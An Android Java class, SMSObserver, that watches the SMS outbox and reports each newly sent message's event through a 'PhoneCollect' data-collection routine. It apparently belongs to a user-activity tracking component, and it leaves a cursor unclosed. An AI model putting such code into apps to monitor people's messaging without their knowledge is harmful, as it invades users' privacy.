package com.data.contentobserver;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import com.data.collect.PhoneCollect;
import com.data.configure.PhoneConfig;
import com.data.info.AppStringInfo;

/**
 * Created by root on 15-1-26.
 */
public class SMSObserver extends ContentObserver {

    private final static String TAG = "SMSObserver";

    Context context;

    /**
     * Creates a content observer.
     *
     * @param handler The handler to run {@link #onChange} on, or null if none.
     */
    public SMSObserver(Context context, Handler handler) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange) {

        //捕获当前操作短信的id号
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/outbox"), null, null, null, null);
        while (cursor.moveToNext()) {
            int id = cursor.getInt(cursor.getColumnIndex("_id"));
            if (id != PhoneConfig.sms_id) {
                //   Log.d(TAG, String.valueOf(PhoneConfig.sms_id));
                //   Log.d(TAG, "send msg success!");
                String smsInfo = AppStringInfo.getAppStringInfo(context, PhoneConfig.PHONE, PhoneConfig.PHONE_SEND_SMS);
                PhoneCollect.getPhoneDatas(smsInfo);
                //记录短信编号，防止重复操作
                PhoneConfig.sms_id = id;
            }
        }
        super.onChange(selfChange);
    }
}
